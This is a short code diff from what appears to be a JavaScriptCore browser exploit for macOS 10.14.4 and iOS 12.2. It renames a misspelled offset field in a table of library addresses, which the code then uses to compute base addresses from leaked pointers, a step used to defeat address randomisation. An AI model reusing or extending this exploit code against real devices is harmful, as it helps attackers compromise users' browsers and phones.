@@ -19,12 +19,12 @@ var jit_addr = 0;
 
 var offset_table = {
 	'osx10.14.4': {
-		jsc_text_csstring_offset: 0xDBDF1D, // __cstring:0000000000DBDF1D aTostringRadixA db 'toString() radix argument must be between 2 and 36',0
+		jsc_text_cstring_offset: 0xDBDF1D, // __cstring:0000000000DBDF1D aTostringRadixA db 'toString() radix argument must be between 2 and 36',0
 		jsc_data_offset: 0x7fff8ba509f8 - 0x7fff8ba3a000 // 0x7fff8ba509f8: 0x00007fff36ef4c30 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
 
 	},
 	'ios12.2': {
-		jsc_text_csstring_offset: 0x0000000188BF84FA - 0x0000000187F9C000, // __cstring:0000000188BF84FA aTostringRadixA DCB "toString() radix argument must be between 2 and 36",0
+		jsc_text_cstring_offset: 0x0000000188BF84FA - 0x0000000187F9C000, // __cstring:0000000188BF84FA aTostringRadixA DCB "toString() radix argument must be between 2 and 36",0
 		jsc_data_offset: 0x1B1B7FDB8 - 0x1B1B68900, // got: 0x1B1B68910
 		// * how to know?
 		// 0x241c2fdb8: 0x00000002187d28c4 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
@@ -305,7 +305,7 @@ function show() {
 
 	// adjust
 	heap_from_fastMalloc -= 4;
-	jsc_text_base_addr -= offset_table[TARGET_VERSION].jsc_text_csstring_offset;
+	jsc_text_base_addr -= offset_table[TARGET_VERSION].jsc_text_cstring_offset;
 	jsc_data_base_addr -= offset_table[TARGET_VERSION].jsc_data_offset;
 
 	// result
